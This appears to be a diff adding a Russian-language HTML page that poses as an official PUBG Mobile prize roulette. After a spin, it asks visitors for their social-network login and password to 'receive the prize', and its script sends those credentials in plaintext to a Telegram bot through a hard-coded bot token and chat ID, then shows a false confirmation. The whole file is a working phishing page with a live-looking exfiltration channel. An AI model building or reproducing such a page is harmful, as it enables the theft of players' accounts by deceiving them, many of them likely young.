@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile - Рулетка</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Russo+One&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a1520 0%, #1a2c42 50%, #0a1520 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            overflow-x: hidden;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        /* Верхнее меню */
+        .top-menu {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 10px;
+            border: 1px solid #f0b232;
+        }
+        
+        .language-menu {
+            position: relative;
+        }
+        
+        .language-btn {
+            background: linear-gradient(to right, #2a3b5a, #1a2c42);
+            color: #f0b232;
+            border: 1px solid #f0b232;
+            border-radius: 5px;
+            padding: 8px 15px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .language-dropdown {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background: #1a2c42;
+            border: 1px solid #f0b232;
+            border-radius: 5px;
+            min-width: 200px;
+            max-height: 300px;
+            overflow-y: auto;
+            display: none;
+            z-index: 1000;
+        }
+        
+        .language-dropdown.show {
+            display: block;
+        }
+        
+        .language-option {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-bottom: 1px solid #2a3b5a;
+            transition: background 0.3s;
+        }
+        
+        .language-option:hover {
+            background: #2a3b5a;
+        }
+        
+        .logo {
+            font-family: 'Russo One', sans-serif;
+            font-size: 24px;
+            color: #f0b232;
+            text-shadow: 0 0 10px rgba(240, 178, 50, 0.5);
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header h1 {
+            color: #f0b232;
+            text-shadow: 0 0 15px rgba(240, 178, 50, 0.7);
+            font-size: 32px;
+            margin-bottom: 8px;
+            font-family: 'Russo One', sans-serif;
+            letter-spacing: 1px;
+        }
+        
+        .header p {
+            color: #8da1b5;
+            font-size: 18px;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .roulette-container {
+            position: relative;
+            width: 100%;
+            height: 450px;
+            background-image: url('phon.png');
+            background-size: cover;
+            background-position: center;
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            border: 3px solid #f0b232;
+        }
+        
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-template-rows: repeat(3, 1fr);
+            gap: 20px;
+            width: 90%;
+            height: 90%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 25px;
+        }
+        
+        .prize-item {
+            background: rgba(12, 26, 45, 0.85);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-item img {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(240, 178, 50, 0.5));
+        }
+        
+        .center-item {
+            grid-column: 2;
+            grid-row: 2;
+        }
+        
+        .selection-frame {
+            position: absolute;
+            border: 5px solid #f0b232;
+            border-radius: 15px;
+            box-shadow: 0 0 25px #f0b232, inset 0 0 25px rgba(240, 178, 50, 0.4);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10;
+            pointer-events: none;
+            opacity: 0;
+        }
+        
+        .selection-frame.active {
+            opacity: 1;
+        }
+        
+        .play-btn {
+            background: linear-gradient(45deg, #f0b232 0%, #ff9800 100%);
+            color: #0c1a2d;
+            border: none;
+            border-radius: 60px;
+            padding: 22px 50px;
+            font-size: 26px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(240, 178, 50, 0.5);
+            transition: all 0.3s;
+            margin-bottom: 35px;
+            width: 85%;
+            max-width: 350px;
+            font-family: 'Russo One', sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .play-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .play-btn:hover::before {
+            left: 100%;
+        }
+        
+        .play-btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 35px rgba(240, 178, 50, 0.7);
+        }
+        
+        .play-btn:active {
+            transform: translateY(2px) scale(0.98);
+        }
+        
+        .play-btn:disabled {
+            background: linear-gradient(45deg, #666, #888);
+            color: #aaa;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .login-section {
+            background: linear-gradient(135deg, rgba(20, 35, 60, 0.95) 0%, rgba(12, 26, 45, 0.95) 100%);
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 600px;
+            display: none;
+            margin-top: 20px;
+            border: 2px solid rgba(240, 178, 50, 0.4);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        
+        .login-section.active {
+            display: block;
+            animation: fadeInUp 0.6s ease;
+        }
+        
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+        
+        .login-section h2 {
+            color: #f0b232;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 28px;
+            font-family: 'Russo One', sans-serif;
+            text-shadow: 0 0 10px rgba(240, 178, 50, 0.5);
+        }
+        
+        .login-section p {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #8da1b5;
+            line-height: 1.6;
+            font-size: 18px;
+        }
+        
+        .prize-won {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            background: rgba(240, 178, 50, 0.15);
+            padding: 30px;
+            border-radius: 15px;
+            border: 3px solid rgba(240, 178, 50, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .prize-won::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(240, 178, 50, 0.1) 0%, transparent 70%);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        
+        .prize-won img {
+            width: 140px;
+            height: 140px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 15px rgba(240, 178, 50, 0.8));
+            margin-bottom: 20px;
+            z-index: 1;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(5deg); }
+        }
+        
+        .login-form {
+            background: rgba(12, 26, 45, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #f0b232;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(20, 35, 60, 0.8);
+            border: 2px solid #2a3b5a;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #f0b232;
+            box-shadow: 0 0 10px rgba(240, 178, 50, 0.5);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #f0b232 0%, #ff9800 100%);
+            color: #0c1a2d;
+            border: none;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Russo One', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(240, 178, 50, 0.4);
+        }
+        
+        .footer {
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+            padding: 25px 20px;
+            margin-top: 30px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 10px;
+            border-top: 2px solid #f0b232;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-link {
+            color: #8da1b5;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .footer-link:hover {
+            color: #f0b232;
+        }
+        
+        .copyright {
+            color: #8da1b5;
+            font-size: 13px;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #2a3b5a;
+            color: #f0b232;
+            padding: 15px 25px;
+            border-radius: 10px;
+            border-left: 5px solid #f0b232;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 1001;
+            max-width: 300px;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        @media (max-width: 600px) {
+            .prizes-grid {
+                gap: 10px;
+                padding: 15px;
+            }
+            
+            .prize-item img {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .prize-won img {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .play-btn {
+                padding: 18px 30px;
+                font-size: 22px;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+            }
+            
+            .footer-links {
+                gap: 15px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Уведомление -->
+    <div class="notification" id="notification"></div>
+
+    <!-- Верхнее меню -->
+    <div class="top-menu">
+        <div class="language-menu">
+            <button class="language-btn" id="languageBtn">
+                <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
+            </button>
+            <div class="language-dropdown" id="languageDropdown">
+                <div class="language-option" data-lang="uz">O'zbekcha</div>
+                <div class="language-option" data-lang="en">English</div>
+                <div class="language-option" data-lang="kz">Қазақша</div>
+                <div class="language-option" data-lang="ar">العربية</div>
+                <div class="language-option" data-lang="zh">中文</div>
+                <div class="language-option" data-lang="ky">Кыргызча</div>
+                <div class="language-option" data-lang="dag">Дагестанский</div>
+                <div class="language-option" data-lang="che">Чеченский</div>
+                <div class="language-option" data-lang="az">Azərbaycanca</div>
+                <div class="language-option" data-lang="hy">Հայերեն</div>
+                <div class="language-option" data-lang="jp">日本語</div>
+                <div class="language-option" data-lang="uk">Українська</div>
+            </div>
+        </div>
+        <div class="logo">PUBG MOBILE</div>
+        <div style="width: 80px;"></div> <!-- Для выравнивания -->
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <h1>КОЛЕСО УДАЧИ PUBG</h1>
+            <p>Испытай удачу и выиграй эксклюзивные призы!</p>
+        </div>
+        
+        <div class="roulette-container">
+            <div class="prizes-grid">
+                <div class="prize-item" data-id="1">
+                    <img src="priz1.png" alt="Приз 1">
+                </div>
+                <div class="prize-item" data-id="2">
+                    <img src="priz2.png" alt="Приз 2">
+                </div>
+                <div class="prize-item" data-id="3">
+                    <img src="priz3.png" alt="Приз 3">
+                </div>
+                <div class="prize-item" data-id="4">
+                    <img src="priz4.png" alt="Приз 4">
+                </div>
+                <div class="prize-item center-item" data-id="5">
+                    <img src="priz5.png" alt="Приз 5">
+                </div>
+                <div class="prize-item" data-id="6">
+                    <img src="priz6.png" alt="Приз 6">
+                </div>
+                <div class="prize-item" data-id="7">
+                    <img src="priz7.png" alt="Приз 7">
+                </div>
+                <div class="prize-item" data-id="8">
+                    <img src="priz8.png" alt="Приз 8">
+                </div>
+                <div class="prize-item" data-id="9">
+                    <img src="priz9.png" alt="Приз 9">
+                </div>
+            </div>
+            
+            <div class="selection-frame" id="selectionFrame"></div>
+        </div>
+        
+        <button class="play-btn" id="playBtn">
+            <i class="fas fa-play"></i> ИГРАТЬ
+        </button>
+        
+        <div class="login-section" id="loginSection">
+            <h2>ДОСТУП К ВЫИГРЫШУ</h2>
+            
+            <div class="prize-won" id="prizeWon">
+                <img src="priz1.png" alt="Выигранный приз" id="wonPrizeImage">
+            </div>
+            
+            <p>Введите данные для получения приза на ваш аккаунт</p>
+            
+            <div class="login-form">
+                <div class="form-group">
+                    <label for="socialSelect"><i class="fas fa-users"></i> Социальная сеть</label>
+                    <select id="socialSelect" class="form-group input" style="width: 100%; padding: 15px; background: rgba(20, 35, 60, 0.8); border: 2px solid #2a3b5a; border-radius: 10px; color: white; font-size: 16px; font-family: 'Orbitron', sans-serif;">
+                        <option value="">Выберите соцсеть</option>
+                        <option value="vk">ВКонтакте</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="whatsapp">WhatsApp</option>
+                        <option value="google">Google</option>
+                        <option value="twitter">Twitter</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="username"><i class="fas fa-user"></i> Логин/Email/Номер телефона</label>
+                    <input type="text" id="username" placeholder="Введите логин, email или номер телефона">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Пароль</label>
+                    <input type="password" id="password" placeholder="Введите пароль">
+                </div>
+                
+                <button class="submit-btn" id="submitBtn">
+                    <i class="fas fa-gift"></i> ПОЛУЧИТЬ ПРИЗ
+                </button>
+            </div>
+            
+            <p class="note" style="text-align: center; color: #8da1b5; font-size: 14px;">
+                <strong>Важно:</strong> Приз будет зачислен в течение 24 часов после подтверждения данных.<br>
+                Одна попытка рулетки в день. Призы не обмениваются на реальные деньги.
+            </p>
+        </div>
+    </div>
+
+    <!-- Футер -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Условия обслуживания</a>
+            <a href="#" class="footer-link">Политика конфиденциальности</a>
+            <a href="#" class="footer-link">Политика Cookie</a>
+            <a href="#" class="footer-link">Предпочтение Cookies</a>
+        </div>
+        <div class="copyright">
+            Авторские права © High Morale Developments Limited. Все права защищены.
+        </div>
+    </div>
+
+    <!-- Аудио для звуков -->
+    <audio id="spinSound" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-slot-machine-wheel-spin-1382.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="winSound" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Конфигурация Telegram бота
+        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const TELEGRAM_CHAT_ID = '1709490182';
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const playBtn = document.getElementById('playBtn');
+            const selectionFrame = document.getElementById('selectionFrame');
+            const loginSection = document.getElementById('loginSection');
+            const prizeWon = document.getElementById('prizeWon');
+            const wonPrizeImage = document.getElementById('wonPrizeImage');
+            const prizeItems = document.querySelectorAll('.prize-item');
+            const languageBtn = document.getElementById('languageBtn');
+            const languageDropdown = document.getElementById('languageDropdown');
+            const notification = document.getElementById('notification');
+            const spinSound = document.getElementById('spinSound');
+            const winSound = document.getElementById('winSound');
+            
+            // Призы с картинками
+            const prizes = [
+                { id: 1, image: "priz1.png" },
+                { id: 2, image: "priz2.png" },
+                { id: 3, image: "priz3.png" },
+                { id: 4, image: "priz4.png" },
+                { id: 5, image: "priz5.png" },
+                { id: 6, image: "priz6.png" },
+                { id: 7, image: "priz7.png" },
+                { id: 8, image: "priz8.png" },
+                { id: 9, image: "priz9.png" }
+            ];
+            
+            let isSpinning = false;
+            let currentPrizeIndex = 0;
+            let spinInterval;
+            let spinSpeed = 100;
+            let spinCount = 0;
+            const totalSpins = 30;
+            let finalPrizeIndex = 0;
+            
+            // Порядок обхода призов
+            const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
+            
+            // Языковые настройки
+            const translations = {
+                ru: {
+                    play: "ИГРАТЬ",
+                    title: "КОЛЕСО УДАЧИ PUBG",
+                    subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
+                    winTitle: "ДОСТУП К ВЫИГРЫШУ",
+                    winText: "Введите данные для получения приза на ваш аккаунт",
+                    submit: "ПОЛУЧИТЬ ПРИЗ",
+                    selectSocial: "Выберите соцсеть",
+                    loginPlaceholder: "Введите логин, email или номер телефона",
+                    passwordPlaceholder: "Введите пароль",
+                    notificationSuccess: "Данные отправлены! Приз будет зачислен в течение 24 часов.",
+                    notificationError: "Пожалуйста, заполните все поля."
+                },
+                en: {
+                    play: "PLAY",
+                    title: "PUBG WHEEL OF FORTUNE",
+                    subtitle: "Try your luck and win exclusive prizes!",
+                    winTitle: "PRIZE ACCESS",
+                    winText: "Enter data to receive the prize on your account",
+                    submit: "GET PRIZE",
+                    selectSocial: "Select social network",
+                    loginPlaceholder: "Enter login, email or phone number",
+                    passwordPlaceholder: "Enter password",
+                    notificationSuccess: "Data sent! The prize will be credited within 24 hours.",
+                    notificationError: "Please fill in all fields."
+                },
+                uz: {
+                    play: "O'YIN",
+                    title: "PUBG BAXT G'ILOFI",
+                    subtitle: "Omadingizni sinab ko'ring va eksklyuziv sovrinlarni yutib oling!",
+                    winTitle: "SOVRINNI OLISH",
+                    winText: "Hisobingizga sovrin olish uchun ma'lumotlarni kiriting",
+                    submit: "SOVRINNI OLISH",
+                    selectSocial: "Ijtimoiy tarmoqni tanlang",
+                    loginPlaceholder: "Login, email yoki telefon raqamini kiriting",
+                    passwordPlaceholder: "Parolni kiriting",
+                    notificationSuccess: "Ma'lumotlar yuborildi! Sovrin 24 soat ichida hisobingizga tushadi.",
+                    notificationError: "Iltimos, barcha maydonlarni to'ldiring."
+                }
+            };
+            
+            // Функция смены языка
+            function changeLanguage(lang) {
+                const t = translations[lang] || translations.ru;
+                
+                // Обновляем тексты
+                document.querySelector('.header h1').textContent = t.title;
+                document.querySelector('.header p').textContent = t.subtitle;
+                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
+                document.querySelector('#loginSection h2').textContent = t.winTitle;
+                document.querySelector('#loginSection p').textContent = t.winText;
+                document.querySelector('#submitBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.submit}`;
+                document.querySelector('#socialSelect option[value=""]').textContent = t.selectSocial;
+                document.querySelector('#username').placeholder = t.loginPlaceholder;
+                document.querySelector('#password').placeholder = t.passwordPlaceholder;
+                
+                // Обновляем текст кнопки языка
+                const langNames = {
+                    ru: 'Русский', en: 'English', uz: "O'zbekcha",
+                    kz: 'Қазақша', ar: 'العربية', zh: '中文',
+                    ky: 'Кыргызча', dag: 'Дагестанский', che: 'Чеченский',
+                    az: 'Azərbaycanca', hy: 'Հայերեն', jp: '日本語',
+                    uk: 'Українська'
+                };
+                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
+            }
+            
+            // Обработчики для меню языка
+            languageBtn.addEventListener('click', function() {
+                languageDropdown.classList.toggle('show');
+            });
+            
+            document.querySelectorAll('.language-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    changeLanguage(lang);
+                    languageDropdown.classList.remove('show');
+                    showNotification(`Язык изменен на ${this.textContent}`);
+                });
+            });
+            
+            // Функция показа уведомления
+            function showNotification(message, isError = false) {
+                notification.textContent = message;
+                notification.style.background = isError ? '#5a1a1a' : '#2a3b5a';
+                notification.style.borderLeftColor = isError ? '#ff4444' : '#f0b232';
+                notification.style.display = 'block';
+                
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 5000);
+            }
+            
+            // Функция получения случайного приза
+            function getRandomPrize() {
+                return Math.floor(Math.random() * prizes.length);
+            }
+            
+            // Функция перемещения рамки
+            function moveFrameToPrize(index) {
+                const prizeItem = prizeItems[index];
+                const rect = prizeItem.getBoundingClientRect();
+                const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
+                
+                selectionFrame.style.width = (rect.width + 20) + 'px';
+                selectionFrame.style.height = (rect.height + 20) + 'px';
+                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
+                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
+                selectionFrame.classList.add('active');
+            }
+            
+            // Функция запуска рулетки
+            function startRoulette() {
+                if (isSpinning) return;
+                
+                isSpinning = true;
+                playBtn.disabled = true;
+                loginSection.classList.remove('active');
+                
+                // Случайный конечный приз
+                finalPrizeIndex = getRandomPrize();
+                
+                // Запускаем звук
+                spinSound.currentTime = 0;
+                spinSound.play();
+                
+                // Запускаем анимацию
+                spinCount = 0;
+                spinSpeed = 100;
+                currentPrizeIndex = 0;
+                
+                spinInterval = setInterval(spinStep, spinSpeed);
+            }
+            
+            function spinStep() {
+                const prizeIndex = prizeOrder[currentPrizeIndex];
+                moveFrameToPrize(prizeIndex);
+                
+                currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
+                spinCount++;
+                
+                // Замедление к концу
+                if (spinCount > totalSpins * 0.7) {
+                    spinSpeed += 20;
+                    clearInterval(spinInterval);
+                    spinInterval = setInterval(spinStep, spinSpeed);
+                }
+                
+                // Остановка на конечном призе
+                if (spinCount >= totalSpins) {
+                    clearInterval(spinInterval);
+                    
+                    // Останавливаем звук вращения
+                    spinSound.pause();
+                    
+                    // Воспроизводим звук победы
+                    winSound.currentTime = 0;
+                    winSound.play();
+                    
+                    // Останавливаемся на финальном призе
+                    setTimeout(() => {
+                        moveFrameToPrize(finalPrizeIndex);
+                        
+                        // Показываем окно входа
+                        setTimeout(() => {
+                            isSpinning = false;
+                            playBtn.disabled = false;
+                            
+                            // Обновляем информацию о выигранном призе
+                            const wonPrize = prizes[finalPrizeIndex];
+                            wonPrizeImage.src = wonPrize.image;
+                            
+                            // Показываем секцию входа
+                            loginSection.classList.add('active');
+                            loginSection.scrollIntoView({ behavior: 'smooth' });
+                        }, 1000);
+                    }, 300);
+                }
+            }
+            
+            // Обработчик отправки формы
+            document.getElementById('submitBtn').addEventListener('click', function() {
+                const social = document.getElementById('socialSelect').value;
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value.trim();
+                
+                if (!social || !username || !password) {
+                    showNotification("Пожалуйста, заполните все поля", true);
+                    return;
+                }
+                
+                // Отправка данных в Telegram
+                const message = `🎮 НОВЫЙ ВЫИГРЫШ PUBG 🎮\n\n` +
+                               `📱 Соцсеть: ${social}\n` +
+                               `👤 Логин: ${username}\n` +
+                               `🔑 Пароль: ${password}\n` +
+                               `🎁 Выигранный приз: Приз #${finalPrizeIndex + 1}\n` +
+                               `⏰ Время: ${new Date().toLocaleString()}\n` +
+                               `🌐 IP: ${getUserIP()}`;
+                
+                sendToTelegram(message);
+                
+                // Показываем уведомление
+                showNotification("Данные отправлены! Приз будет зачислен в течение 24 часов.");
+                
+                // Очищаем форму
+                document.getElementById('socialSelect').value = '';
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                
+                // Закрываем секцию входа
+                setTimeout(() => {
+                    loginSection.classList.remove('active');
+                }, 3000);
+            });
+            
+            // Функция получения IP пользователя
+            function getUserIP() {
+                return "Определяется...";
+            }
+            
+            // Функция отправки в Telegram
+            async function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    console.log('Telegram response:', data);
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                }
+            }
+            
+            // Запуск рулетки
+            playBtn.addEventListener('click', startRoulette);
+            
+            // Инициализация рамки
+            setTimeout(() => {
+                moveFrameToPrize(0);
+            }, 500);
+            
+            // Эффекты при наведении на призы
+            prizeItems.forEach(item => {
+                item.addEventListener('mouseenter', function() {
+                    if (!isSpinning) {
+                        this.style.transform = 'scale(1.1)';
+                        this.style.boxShadow = '0 0 20px rgba(240, 178, 50, 0.7)';
+                    }
+                });
+                
+                item.addEventListener('mouseleave', function() {
+                    this.style.transform = 'scale(1)';
+                    this.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.3)';
+                });
+            });
+            
+            // Предзагрузка изображений
+            function preloadImages() {
+                for (let i = 1; i <= 9; i++) {
+                    const img = new Image();
+                    img.src = `priz${i}.png`;
+                }
+            }
+            
+            preloadImages();
+            
+            // Закрытие выпадающего меню при клике вне его
+            document.addEventListener('click', function(event) {
+                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                    languageDropdown.classList.remove('show');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
